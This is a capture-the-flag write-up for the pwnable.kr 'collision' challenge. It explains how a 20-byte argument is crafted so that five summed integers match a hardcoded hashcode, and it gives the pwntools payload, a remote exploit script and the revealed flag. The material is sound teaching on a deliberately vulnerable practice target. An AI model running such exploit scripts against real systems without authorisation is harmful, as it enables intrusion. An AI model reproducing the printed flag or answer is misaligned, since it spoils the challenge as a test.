# collision

## step-by-step

Following the game instructions, you need to connect to a remote machine using the following command:

```
ssh col@pwnable.kr -p2222
```

> [!WARNING]
> The password to access the remote machine is `guest`.

```
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Mon Jul  1 03:16:08 2024 from 101.176.80.154
col@pwnable:~$
```

Let's try using the `ls -la` command to see which files we have access to:

```
col@pwnable:~$ ls -la
total 36
drwxr-x---   5 root    col     4096 Oct 23  2016 .
drwxr-xr-x 116 root    root    4096 Oct 30  2023 ..
d---------   2 root    root    4096 Jun 12  2014 .bash_history
-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col
-rw-r--r--   1 root    root     555 Jun 12  2014 col.c
-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag
dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache
```

as you can imagine, the flag we are looking for is found inside the `flag` file, however, as you can imagine from the permissions, we cannot view the content, in fact using the `cat flag` command we obtain:

```
col@pwnable:~$ cat flag 
cat: flag: Permission denied
```

We therefore note that there is an ELF file, i.e. `col`, correlated by the `col.c` source whose contents we can view using the `cat col.c` command:

```
col@pwnable:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

Well, let's just focus on the C language, so I'll write the code more plainly:

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

> [!NOTE]
> I apologize for the very messy style but it wouldn't make sense to fix it because it is important to develop the ability to read, modify and exploit code written by others.

In this code we notice:

1. The ability to pass a passcode via command line, using `argv`.
2. That the length of `argv[1]` must be 20 bytes and this check is done using the `strlen()` function.
3. That the address `0x21DD09EC`, contained in the `hashcode` variable, must be equal to the value returned by the `check_password()` function for the `system("/bin/cat flag");` statement to be executed, which coincidentally is exactly the command we need to find the flag.
4. That the argument of the `check_password()` function is precisely the passcode contained in `argv[1]`.
5. That to ensure that the `res` variable, of the `check_password()` function, is equal to the `hashcode` variable it is necessary to perform 5 sums starting from the address of the passed parameter, i.e. `argv[1]`, which in turn is converted from character pointer to integer pointer.

This means that you need to insert a passcode such that by adding its address 5 times you get that the content of the `res` variable is equal to the content of the `hashcode` variable. And how do we know which address to enter to do this?

> [!TIP]
> More information about [hash collision attack](https://privacycanada.net/hash-functions/hash-collision-attack/).

Knowing that `0x21DD09EC` is the address we want to reach after making 5 sums, we can perform the following division: 

$$k = \frac{\text{hashcode}}{5}$$

where $k$ represents exactly the single address which, if added to itself 5 times, allows us to obtain the starting address `0x21DD09EC`. The problem is that if we run the command `python -c "print(0x21DD09EC)"` we get:

```
[berna@berna collision]$ python -c "print(0x21DD09EC)"
568134124
```

and therefore if we calculate the division we obtain:

```
[berna@berna collision]$ python -c "print(0x21DD09EC / 5)"
113626824.8
```

this means that the address contained in the `hashcode` variable is not divisible by 5 and therefore the remainder must be taken into consideration:

```
[berna@berna collision]$ python -c "print(0x21DD09EC % 5)"
4
```

Let's therefore try to use the integer division theorem which tells us that:

$$N = \lfloor{ Q \rfloor } \cdot D + R$$

where $N$ is the numerator, $\lfloor{ Q \rfloor }$ is the quotient (more precisely it is the lower integer part), $D$ is the denominator and $R$ is the remainder. Therefore we can write:

```
[berna@berna collision]$ python -c "print(113626824 * 5 + 4)"
568134124
```

Everything seems ok, so before creating our exploit in `Python` let's try to see for which architecture the ELF file `col` can be executed. To do this we use the `readelf` command as follows:

```
col@pwnable:~$ readelf -h col
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x80483e0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4428 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 27
```

as can be understood, it is an ELF file for a 32-bit architecture and this means that the integer pointers, i.e. `int *ip`, are represented with 4 bytes and this implies that there are 5 blocks with 4 bytes each. This last information is important because we need to prepare the strings to inject into the code. In particular, we can open a python shell using the `python` command (I recommend using a local shell and not the one used for the `ssh` connection):

```
[berna@berna collision]$ python
Python 3.12.4 (main, Jun  7 2024, 06:33:07) [GCC 14.1.1 20240522] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> payload = p32(113626824) * 5 + p32(4)
>>> payload
b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\x04\x00\x00\x00'
>>> 
```

in particular the `p32()` function is used to pack `113626824` and `4`, using 4 bytes (i.e. 32 bits) in little endian, however looking at the `payload` obtained we notice that to pack the value `4` we obtain some `\x00` and this is a problem. In fact, if we look at the C code, we notice the presence of the `strlen()` function which checks whether we have inserted precisely 20 bytes. But the `strlen()` function is designed to return the number of characters in a string starting from the first character until it finds the string terminator `'\0'`. So the problem is that `\x00` is interpreted as a string terminator hijacking the `strlen()` function and producing the message `passcode length should be 20 bytes`. Another problem however is due to the fact that if we use the `len(payload)` instruction we obtain 24 bytes instead of the required 20 bytes.

To solve this problems we need to think slightly differently than we did now. All the considerations made are correct but to fix this problems we can dedicate 4 out of 5 blocks to the result of the division and 1 out of 5 blocks for the remaining representation. In particular the previous instruction:

```
[berna@berna collision]$ python -c "print(113626824 * 5 + 4)"
568134124
```

becomes the following:

```
[berna@berna collision]$ python -c "print(0x21DD09EC - 113626824 * 4)"
113626828
```

that is, instead of dedicating 5 blocks and adding the remainder (as happens here `113626824 * 5 + 4`) we dedicate 4 blocks for `113626824` and 1 block for the remaining data, but knowing that `0x21DD09EC` is the sum of all the blocks (regardless of how they are dedicated) by subtracting `0x21DD09EC - 113626824 * 4` you actually obtain the remaining data `113626828`.

So let's try using a python shell again as before:

```
(venv) [berna@berna collision]$ python
Python 3.12.4 (main, Jun  7 2024, 06:33:07) [GCC 14.1.1 20240522] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> payload = p32(113626824) * 4 + p32(113626828)
>>> payload
b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
>>> 
```

Everything seems ok, so I'd say let's see it in action:

```
col@pwnable:~$ ./col $(python -c "print('\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06')")
daddy! I just managed to create a hash collision :)
```

> [!WARNING]
> Pay attention to the fact that the `python` and `python3` commands are different, in fact the instruction for injecting the `payload`, used just now, uses `Python 2` since the `python` command was used. To use `Python 3` you need to use the command `./col $(python3 -c "import sys; sys.stdout.buffer.write(b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06 \xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06')")`.

Perfect, everything went according to plan! So as you can imagine the flag you are looking for is the following sentence:

```
daddy! I just managed to create a hash collision :)
```

## Exploitation

Finally, we can use the following exploit, written in `Python`, to replicate the vulnerability in a fully automated way:

```python
from pwn import *

hashcode = 0x21DD09EC 
one_block = hashcode // 5 # 113626824
remaining_data = hashcode - one_block * 4 # 113626828
payload = p32(one_block) * 4 + p32(remaining_data)

shell = ssh("col", "pwnable.kr", password="guest", port=2222)
process = shell.process(executable="./col", argv=["col", payload])

flag = str(process.recv())
log.success(f"Flag: {flag}")

process.close()
shell.close()
```

then using the `python exploit.py` command we get:

```
[+] Connecting to pwnable.kr on port 2222: Done
[*] fd@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process bytearray(b'./col') on pwnable.kr: pid 303168
[+] Flag: b'daddy! I just managed to create a hash collision :)\n'
[*] Stopped remote process 'col' on pwnable.kr (pid 303168)
[*] Closed connection to 'pwnable.kr'
```

